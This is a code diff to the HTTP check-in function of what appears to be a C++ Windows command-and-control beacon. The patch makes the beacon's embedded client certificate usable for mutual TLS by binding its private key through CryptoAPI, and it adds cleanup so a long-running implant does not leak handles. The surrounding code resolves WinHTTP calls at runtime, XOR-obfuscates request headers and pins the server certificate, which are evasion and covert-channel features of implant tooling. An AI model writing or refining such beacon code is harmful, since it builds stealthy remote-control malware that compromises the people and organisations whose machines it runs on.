@@ -528,7 +528,10 @@ inline std::string http_request(
     // verified per-request. On failure we simply proceed without the cert —
     // the server-side middleware decides whether that is acceptable.
     HCERTSTORE client_store = nullptr;
-    PCCERT_CONTEXT client_cert = nullptr;
+    PCCERT_CONTEXT client_cert = nullptr;        // owned by client_store
+    PCCERT_CONTEXT client_cert_bound = nullptr;  // duplicate carrying the key
+    HCRYPTPROV client_csp = 0;                   // provider to release at the end
+    BOOL client_csp_free = FALSE;
     CRYPT_DATA_BLOB pfx_blob{};
     pfx_blob.pbData = const_cast<BYTE*>(BEACON_CLIENT_PFX);
     pfx_blob.cbData = BEACON_CLIENT_PFX_LEN;
@@ -542,6 +545,88 @@ inline std::string http_request(
     }
     if (client_store) {
         client_cert = CertEnumCertificatesInStore(client_store, nullptr);
+    }
+    // KEY-PROVIDER ASSOCIATION (measured 2026-11-05 on Windows): the context
+    // returned by CertEnumCertificatesInStore after a PKCS12_NO_PERSIST_KEY
+    // import carries SHA1_HASH but NOT CERT_KEY_PROV_INFO
+    // (`KEY_PROV_INFO present=0`, `SHA1_HASH present=1`), so
+    // WinHttpSetOption(WINHTTP_OPTION_CLIENT_CERT_CONTEXT) cannot reach the
+    // private key: the request fails with
+    // ERROR_WINHTTP_CLIENT_CERT_NO_ACCESS_PRIVATE_KEY (GLE 12018 on the
+    // diagnostic build) and the check-in comes back EMPTY. Schannel reads the
+    // key from CERT_KEY_CONTEXT_PROP_ID, so acquire it explicitly and write
+    // that property on a DUPLICATE of the context. The store-owned context is
+    // left untouched (it is freed with the store).
+    if (client_cert) {
+        HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hKey = 0;
+        DWORD key_spec = 0;
+        BOOL free_key = FALSE;
+        DWORD prov_info_len = 0;
+        BOOL has_prov_info = CertGetCertificateContextProperty(
+            client_cert, CERT_KEY_PROV_INFO_PROP_ID, nullptr, &prov_info_len);
+        BOOL acquired = !has_prov_info &&
+            CryptAcquireCertificatePrivateKey(
+                client_cert, CRYPT_ACQUIRE_SILENT_FLAG, nullptr,
+                &hKey, &key_spec, &free_key);
+        if (acquired && key_spec == CERT_NCRYPT_KEY_SPEC) {
+            // A CNG key. It is only usable by WinHTTP through a
+            // key-provider association this context does not have, so fall
+            // through to the persisted import — but release the handle first.
+            // NCryptFreeObject is resolved at runtime so the build does not
+            // need ncrypt.lib, and because leaking one key handle per request
+            // would exhaust a long-running beacon.
+            if (free_key && hKey) {
+                HMODULE ncrypt = GetModuleHandleW(L"ncrypt.dll");
+                if (!ncrypt) ncrypt = LoadLibraryW(L"ncrypt.dll");
+                if (ncrypt) {
+                    typedef LONG (WINAPI *PfnNCryptFreeObject)(void*);
+                    PfnNCryptFreeObject free_obj =
+                        reinterpret_cast<PfnNCryptFreeObject>(
+                            GetProcAddress(ncrypt, "NCryptFreeObject"));
+                    if (free_obj) free_obj(reinterpret_cast<void*>(hKey));
+                }
+            }
+            hKey = 0;
+            free_key = FALSE;
+        }
+        if (acquired && key_spec != CERT_NCRYPT_KEY_SPEC) {
+            PCCERT_CONTEXT bound = CertDuplicateCertificateContext(client_cert);
+            if (bound) {
+                CERT_KEY_CONTEXT kc{};
+                kc.cbSize = sizeof(kc);
+                kc.hCryptProv = hKey;
+                kc.dwKeySpec = key_spec;
+                if (CertSetCertificateContextProperty(
+                        bound, CERT_KEY_CONTEXT_PROP_ID, 0, &kc)) {
+                    client_cert_bound = bound;
+                    if (free_key) {
+                        client_csp = hKey;
+                        client_csp_free = TRUE;
+                    }
+                } else {
+                    CertFreeCertificateContext(bound);
+                    if (free_key) CryptReleaseContext(hKey, 0);
+                }
+            } else if (free_key) {
+                CryptReleaseContext(hKey, 0);
+            }
+        }
+        if (!client_cert_bound && !has_prov_info) {
+            // CNG-only machines expose the key through NCrypt, and this build
+            // deliberately does not link ncrypt. Fall back to importing the
+            // PFX WITH a persisted key container — the documented way WinHTTP
+            // obtains a certificate context whose private key it can use.
+            // Only one store is left open so the cleanup frees the right one.
+            if (client_store) {
+                CertCloseStore(client_store, 0);
+                client_store = nullptr;
+            }
+            client_cert = nullptr;
+            client_store = PFXImportCertStore(&pfx_blob, nullptr, 0);
+            if (client_store) {
+                client_cert = CertEnumCertificatesInStore(client_store, nullptr);
+            }
+        }
     }
 #endif
 // Obfuscate the Content-Type header using compile‑time XOR
@@ -601,11 +686,15 @@ headers += std::wstring(L"X-Beacon-Auth: ") + std::wstring(auth.signature.begin(
 
 BOOL bResult = FALSE;
 #if BEACON_MTLS_ENABLED
-if (client_cert) {
+// The BOUND context (duplicate + CERT_KEY_CONTEXT_PROP_ID) is what Schannel
+// can actually use; the store-owned one is only a fallback for hosts that
+// already carry a key-provider association.
+PCCERT_CONTEXT presented = client_cert_bound ? client_cert_bound : client_cert;
+if (presented) {
     // Attempt 0: present the embedded client certificate.
     winhttp_dyn::WinHttpSetOptionDynamic(hRequest,
         WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
-        (LPVOID)client_cert, sizeof(*client_cert));
+        (LPVOID)presented, sizeof(*presented));
     bResult = winhttp_dyn::WinHttpSendRequestDynamic(
         hRequest,
         headers.c_str(),
@@ -654,7 +743,9 @@ bResult = winhttp_dyn::WinHttpSendRequestDynamic(
 #endif
 if (!bResult || !hRequest) {
 #if BEACON_MTLS_ENABLED
+    if (client_cert_bound) CertFreeCertificateContext(client_cert_bound);
     if (client_cert) CertFreeCertificateContext(client_cert);
+    if (client_csp_free && client_csp) CryptReleaseContext(client_csp, 0);
     if (client_store) CertCloseStore(client_store, 0);
 #endif
     g_ctx.cleanup();
@@ -673,7 +764,9 @@ if (!body.empty()) {
                 chunkSize,
                 &chunkSize)) {
 #if BEACON_MTLS_ENABLED
+            if (client_cert_bound) CertFreeCertificateContext(client_cert_bound);
             if (client_cert) CertFreeCertificateContext(client_cert);
+            if (client_csp_free && client_csp) CryptReleaseContext(client_csp, 0);
             if (client_store) CertCloseStore(client_store, 0);
 #endif
             g_ctx.cleanup();
@@ -687,7 +780,9 @@ if (!body.empty()) {
 bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
     if (!bResult) {
 #if BEACON_MTLS_ENABLED
+        if (client_cert_bound) CertFreeCertificateContext(client_cert_bound);
         if (client_cert) CertFreeCertificateContext(client_cert);
+        if (client_csp_free && client_csp) CryptReleaseContext(client_csp, 0);
         if (client_store) CertCloseStore(client_store, 0);
 #endif
         g_ctx.cleanup();
@@ -721,7 +816,9 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
     if (peer_cert) CertFreeCertificateContext(peer_cert);
     if (!pin_ok) {
 #if BEACON_MTLS_ENABLED
+        if (client_cert_bound) CertFreeCertificateContext(client_cert_bound);
         if (client_cert) CertFreeCertificateContext(client_cert);
+        if (client_csp_free && client_csp) CryptReleaseContext(client_csp, 0);
         if (client_store) CertCloseStore(client_store, 0);
 #endif
         g_ctx.cleanup();
@@ -752,7 +849,9 @@ bResult = winhttp_dyn::WinHttpReceiveResponseDynamic(hRequest, nullptr);
     }
 
 #if BEACON_MTLS_ENABLED
+    if (client_cert_bound) CertFreeCertificateContext(client_cert_bound);
     if (client_cert) CertFreeCertificateContext(client_cert);
+    if (client_csp_free && client_csp) CryptReleaseContext(client_csp, 0);
     if (client_store) CertCloseStore(client_store, 0);
 #endif
     winhttp_dyn::WinHttpCloseHandleDynamic(hRequest);
